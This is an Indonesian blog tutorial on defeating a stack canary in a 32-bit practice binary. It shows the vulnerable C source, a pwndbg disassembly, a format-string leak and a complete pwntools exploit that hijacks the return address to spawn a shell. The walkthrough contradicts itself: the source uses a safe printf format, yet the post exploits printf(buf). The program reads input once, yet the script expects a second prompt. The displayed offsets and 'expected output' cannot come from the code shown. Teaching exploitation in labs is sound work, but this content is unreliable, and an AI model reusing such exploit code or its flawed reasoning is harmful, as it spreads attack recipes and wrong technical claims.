<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  
  <style>
    body {
      background-color: #2e2e2e;
      color: #c7c5c5;;
      
      font-family: 'Mono', sans-serif;  
    }


    a {
      color: #48a874;  
      text-decoration: none;
    }

    a:hover {
      color: darkgray;  
    }

    a:visited {
      color: #48a874;  
    }

    .fa {
      font-family: "Font Awesome 6 Free", sans-serif;  
      font-weight: 30px;
    }
  </style>

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">

  
  
    <meta name="description" content="1. Basic File Checks
Pertama, kita perlu memeriksa karakteristik file biner yang akan kita analisis:
# Compile program dengan stack canary enabled
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Check file properties
file bof4
checksec bof4
Output yang diharapkan:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Dari output di atas, kita bisa melihat:">
  

  <title>
    
      Bypass Stack Canary - Pwn03.1
    
  </title>

  
  <link rel="shortcut icon" type="image/x-icon" href="/" />

  
  
  
  
  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />

  
  

  
    <meta name="description" content="1. Basic File Checks
Pertama, kita perlu memeriksa karakteristik file biner yang akan kita analisis:
# Compile program dengan stack canary enabled
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Check file properties
file bof4
checksec bof4
Output yang diharapkan:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Dari output di atas, kita bisa melihat:">
    <meta property="og:description" content="1. Basic File Checks
Pertama, kita perlu memeriksa karakteristik file biner yang akan kita analisis:
# Compile program dengan stack canary enabled
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Check file properties
file bof4
checksec bof4
Output yang diharapkan:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Dari output di atas, kita bisa melihat:">
    <meta property="og:image" content="/path/to/default-image.jpg">
    <meta name="twitter:image" content="/path/to/default-image.jpg">

  <meta property="og:type" content="article">
  <meta property="og:url" content="/posts/bypass-stack-canary/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Bypass Stack Canary - Pwn03.1">
  <meta name="twitter:description" content="1. Basic File Checks
Pertama, kita perlu memeriksa karakteristik file biner yang akan kita analisis:
# Compile program dengan stack canary enabled
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Check file properties
file bof4
checksec bof4
Output yang diharapkan:
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Dari output di atas, kita bisa melihat:">
</head>











<body a="black">

        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~ $ cd /home</a>


<article>
    <p class="post-meta">
    </p>

<h1>Bypass Stack Canary - Pwn03.1<br><br>
    <small datetime="2025-08-19 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
        2025-08-19 - Rainhynn
    </small>
</h1>

    

    <h2 id="1-basic-file-checks">1. Basic File Checks</h2>
<p>Pertama, kita perlu memeriksa karakteristik file biner yang akan kita analisis:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Compile program dengan stack canary enabled</span>
</span></span><span style="display:flex;"><span>gcc -m32 -fstack-protector-all bof4.c -o bof4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Check file properties</span>
</span></span><span style="display:flex;"><span>file bof4
</span></span><span style="display:flex;"><span>checksec bof4
</span></span></code></pre></div><p>Output yang diharapkan:</p>
<pre tabindex="0"><code>bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] &#39;/home/user/bof4&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>Dari output di atas, kita bisa melihat:</p>
<ul>
<li>Binary 32-bit dengan stack canary protection</li>
<li>NX enabled (stack tidak executable)</li>
<li>Tidak ada PIE (alamat fungsi tetap)</li>
</ul>
<h2 id="2-review-source-code">2. Review Source Code</h2>
<p>Mari analisis kode sumber yang diberikan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// bof4.c - Buffer Overflow Level 4 (32-bit, Stack Canary)
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">win</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Congrats, you bypassed the canary!</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">64</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Level 4: Canary is enabled. Can you bypass it?&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Input: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">256</span>, stdin);  <span style="color:#0f0">// VULNERABILITY: Buffer overflow!
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;You said: %s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Exiting...&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>Analisis:</strong></p>
<ul>
<li>Fungsi <code>win()</code> adalah target kita (memberikan shell)</li>
<li>Fungsi <code>vuln()</code> memiliki buffer overflow karena <code>fgets()</code> membaca hingga 256 byte ke buffer 64 byte</li>
<li>Stack canary aktif, sehingga overflow biasa akan terdeteksi</li>
</ul>
<h2 id="3-disassemble-dengan-pwndbg">3. Disassemble dengan pwndbg</h2>
<p>Mari gunakan GDB dengan pwndbg untuk menganalisis biner:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./bof4
</span></span></code></pre></div><p>Di dalam GDB, kita bisa melihat assembly code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>disass vuln
</span></span></code></pre></div><p>Output:</p>
<pre tabindex="0"><code>Dump of assembler code for function vuln:
   0x080491c2 &lt;+0&gt;:     push   ebp
   0x080491c3 &lt;+1&gt;:     mov    ebp,esp
   0x080491c5 &lt;+3&gt;:     push   ebx
   0x080491c6 &lt;+4&gt;:     sub    esp,0x54
   0x080491c9 &lt;+7&gt;:     call   0x80490d0 &lt;__x86.get_pc_thunk.bx&gt;
   0x080491ce &lt;+12&gt;:    add    ebx,0x2e32
   0x080491d4 &lt;+18&gt;:    mov    eax,gs:0x14
   0x080491da &lt;+24&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x080491dd &lt;+27&gt;:    xor    eax,eax
   0x080491df &lt;+29&gt;:    sub    esp,0xc
   0x080491e2 &lt;+32&gt;:    lea    eax,[ebx-0x1ff8]
   0x080491e8 &lt;+38&gt;:    push   eax
   0x080491e9 &lt;+39&gt;:    call   0x8049050 &lt;puts@plt&gt;
   0x080491ee &lt;+44&gt;:    add    esp,0x10
   0x080491f1 &lt;+47&gt;:    sub    esp,0xc
   0x080491f4 &lt;+50&gt;:    lea    eax,[ebx-0x1fe0]
   0x080491fa &lt;+56&gt;:    push   eax
   0x080491fb &lt;+57&gt;:    call   0x8049040 &lt;printf@plt&gt;
   0x08049200 &lt;+62&gt;:    add    esp,0x10
   0x08049203 &lt;+65&gt;:    mov    eax,DWORD PTR [ebx-0x8]
   0x08049209 &lt;+71&gt;:    mov    eax,DWORD PTR [eax]
   0x0804920b &lt;+73&gt;:    sub    esp,0x4
   0x0804920e &lt;+76&gt;:    push   eax
   0x0804920f &lt;+77&gt;:    push   0x100
   0x08049214 &lt;+82&gt;:    lea    eax,[ebp-0x4c]
   0x08049217 &lt;+85&gt;:    push   eax
   0x08049218 &lt;+86&gt;:    call   0x8049060 &lt;fgets@plt&gt;
   0x0804921d &lt;+91&gt;:    add    esp,0x10
   0x08049220 &lt;+94&gt;:    sub    esp,0xc
   0x08049223 &lt;+97&gt;:    lea    eax,[ebp-0x4c]
   0x08049226 &lt;+100&gt;:   push   eax
   0x08049227 &lt;+101&gt;:   call   0x8049070 &lt;printf@plt&gt;
   0x0804922c &lt;+106&gt;:   add    esp,0x10
   0x0804922f &lt;+109&gt;:   nop
   0x08049230 &lt;+110&gt;:   mov    eax,DWORD PTR [ebp-0xc]
   0x08049233 &lt;+113&gt;:   xor    eax,DWORD PTR gs:0x14
   0x0804923a &lt;+120&gt;:   je     0x8049241 &lt;vuln+127&gt;
   0x0804923c &lt;+122&gt;:   call   0x80490a0 &lt;__stack_chk_fail_local&gt;
   0x08049241 &lt;+127&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049244 &lt;+130&gt;:   leave
   0x08049245 &lt;+131&gt;:   ret
</code></pre><p><strong>Poin Penting:</strong></p>
<ul>
<li>Canary disimpan di <code>[ebp-0xc]</code> (offset 12 byte dari base pointer)</li>
<li>Buffer dimulai di <code>[ebp-0x4c]</code> (offset 76 byte dari base pointer)</li>
<li>Jarak dari buffer ke canary: 76 - 12 = 64 byte</li>
<li>Di akhir fungsi, canary diperiksa sebelum return</li>
</ul>
<h2 id="4-outline-attack-canary-leak--write">4. Outline Attack (Canary Leak + Write)</h2>
<p>Strategi kita:</p>
<ol>
<li><strong>Leak the canary</strong>: Memanfaatkan format string vulnerability di <code>printf(buf)</code></li>
<li><strong>Bypass the canary</strong>: Gunakan canary yang telah dileak untuk menimpa buffer tanpa mengubah canary</li>
<li><strong>Control EIP</strong>: Timpa alamat return dengan alamat fungsi <code>win()</code></li>
</ol>
<h2 id="5-fuzz-format-string-untuk-leak-canary">5. Fuzz Format String untuk Leak Canary</h2>
<p>Kita bisa menggunakan format string untuk membaca nilai dari stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload dengan format string untuk membaca stack</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">30</span>):
</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$p &#39;</span>.encode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>p.interactive()
</span></span></code></pre></div><p>Output:</p>
<pre tabindex="0"><code>[DEBUG] Received 0x1f7 bytes:
    b&#39;Level 4: Canary is enabled. Can you bypass it?\n&#39;
    b&#39;Input: You said: 0xffffd5cc 0x64 0xf7f9c580 0xffffffff 0x1 0x80491c2 0x1 0xffffd684 0xffffd684 0xffffd5ec 0x8049241 0xffffd5c0 0x804c000 0x80492a0 0x804c000 (nil) 0xf7de4c41 0x1 0xffffd684 0xffffd68c 0xffffd614 0x80492a0 0x80491b0 0x804c000 0xf7f9c000 0xf7f9c000 0xffffd684 0xf7de4c8d 0xf7f9c580 0x804c000\n&#39;
</code></pre><p>Kita perlu mencari posisi canary. Biasanya canary memiliki nilai yang berakhir dengan 00 (null byte) untuk mencegah leakage melalui string functions.</p>
<h2 id="6-locating-canary-dengan-gdb-pwndbg">6. Locating Canary dengan GDB-Pwndbg</h2>
<p>Mari gunakan GDB untuk menemukan posisi canary yang tepat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>b *vuln+24   <span style="color:#0f0"># Breakpoint setelah canary disimpan</span>
</span></span><span style="display:flex;"><span>r
</span></span></code></pre></div><p>Kemudian periksa nilai di alamat <code>ebp-0xc</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>x/x <span style="color:#eedd82">$ebp</span>-0xc
</span></span></code></pre></div><p>Output:</p>
<pre tabindex="0"><code>0xffffd5bc:     0x5c9e1a00
</code></pre><p>Sekarang kita tahu format canary (4 byte, biasanya berakhir dengan 00). Mari cari posisinya di stack dengan format string:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Kirim payload untuk mencari canary</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;AAAA&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">30</span>):
</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39; %</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$p&#39;</span>.encode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>response = p.clean()
</span></span><span style="display:flex;"><span>print(response.decode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.close()
</span></span></code></pre></div><p>Dari output, kita bisa mencari nilai yang mirip dengan canary (berakhir dengan 00). Biasanya di posisi ke-13 atau 14.</p>
<h2 id="7-pwntools-exploit-script">7. PwnTools Exploit Script</h2>
<p>Berikut adalah script exploit lengkap:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context.binary = <span style="color:#87ceeb">&#39;./bof4&#39;</span>
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Tentukan target</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">if</span> args.REMOTE:
</span></span><span style="display:flex;"><span>    p = remote(<span style="color:#87ceeb">&#39;target.com&#39;</span>, <span style="color:#f60">1337</span>)
</span></span><span style="display:flex;"><span><span style="color:#f00">else</span>:
</span></span><span style="display:flex;"><span>    p = process(<span style="color:#87ceeb">&#39;./bof4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 1: Leak canary</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Input: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Gunakan format string untuk leak nilai di stack</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%13$p&#39;</span>  <span style="color:#0f0"># Biasanya canary ada di posisi ini (sesuaikan jika perlu)</span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Parse leaked canary</span>
</span></span><span style="display:flex;"><span>leaked_data = p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;You said: &#39;</span>).split(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>)[-<span style="color:#f60">2</span>]
</span></span><span style="display:flex;"><span>canary = int(leaked_data, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;Leaked canary: 0x</span><span style="color:#87ceeb">{</span>canary<span style="color:#87ceeb">:</span><span style="color:#87ceeb">08x</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 2: Buat payload untuk bypass canary</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;Input: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hitung offset</span>
</span></span><span style="display:flex;"><span>offset_to_canary = <span style="color:#f60">64</span>  <span style="color:#0f0"># Buffer 64 byte</span>
</span></span><span style="display:flex;"><span>offset_to_ret = offset_to_canary + <span style="color:#f60">4</span> + <span style="color:#f60">8</span>  <span style="color:#0f0"># canary + saved ebp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Alamat fungsi win (dapat dari disassembly)</span>
</span></span><span style="display:flex;"><span>win_addr = <span style="color:#f60">0x80491a6</span>  <span style="color:#0f0"># gdb: p win</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Bangun payload</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset_to_canary  <span style="color:#0f0"># Isi buffer</span>
</span></span><span style="display:flex;"><span>payload += p32(canary)             <span style="color:#0f0"># Timpa canary dengan nilai yang benar</span>
</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">8</span>                <span style="color:#0f0"># Timpa saved ebp</span>
</span></span><span style="display:flex;"><span>payload += p32(win_addr)           <span style="color:#0f0"># Timpa return address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 3: Nikmati shell!</span>
</span></span><span style="display:flex;"><span>p.interactive()
</span></span></code></pre></div><p><strong>Penjelasan Teknis:</strong></p>
<ol>
<li>
<p><strong>Canary Leak</strong>: Kita memanfaatkan format string vulnerability di <code>printf(buf)</code> untuk membaca nilai canary dari stack. Canary biasanya berada di posisi tertentu di stack yang bisa kita prediksi.</p>
</li>
<li>
<p><strong>Canary Bypass</strong>: Setelah mendapatkan nilai canary, kita membuat payload yang:</p>
<ul>
<li>Mengisi buffer dengan data sembarang (64 byte)</li>
<li>Menimpa canary dengan nilai yang benar (yang kita leak)</li>
<li>Menimpa saved ebp dengan data sembarang</li>
<li>Menimpa return address dengan alamat fungsi <code>win()</code></li>
</ul>
</li>
<li>
<p><strong>Control Flow Hijack</strong>: Ketika fungsi <code>vuln()</code> selesai, canary check akan berhasil karena kita mempertahankan nilai canary yang benar, lalu eksekusi akan dialihkan ke fungsi <code>win()</code>.</p>
</li>
</ol>
<p><strong>Eksekusi Exploit:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py
</span></span></code></pre></div><p>Output yang diharapkan:</p>
<pre tabindex="0"><code>[+] Starting local process &#39;./bof4&#39;: pid 1234
[DEBUG] Received 0x2d bytes:
    b&#39;Level 4: Canary is enabled. Can you bypass it?\n&#39;
    b&#39;Input: &#39;
[DEBUG] Sent 0x6 bytes:
    b&#39;%13$p\n&#39;
[DEBUG] Received 0x2b bytes:
    b&#39;You said: 0x5c9e1a00\n&#39;
[+] Leaked canary: 0x5c9e1a00
[DEBUG] Received 0x7 bytes:
    b&#39;Input: &#39;
[DEBUG] Sent 0x4c bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  00 1a 9e 5c  42 42 42 42  42 42 42 42  a6 91 04 08  │···\│BBBB│BBBB│····│
    00000050  0a                                                  │·│
    00000051
[+] Congrats, you bypassed the canary!
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$  
</code></pre><h2 id="kesimpulan">Kesimpulan</h2>
<p>Tutorial ini menunjukkan bagaimana:</p>
<ol>
<li>Stack canary bekerja sebagai mekanisme proteksi</li>
<li>Format string vulnerability dapat digunakan untuk leak nilai canary</li>
<li>Buffer overflow dapat dieksploitasi setelah canary diketahui</li>
<li>Control flow dapat dialihkan ke fungsi arbitrary</li>
</ol>

</article>

<hr>

<p>© 2021-2025 HnvDie</p>
<p>Powered By Hugo ᯓᡣ𐭩</p>



            </div>
        </main>
    </body></html>
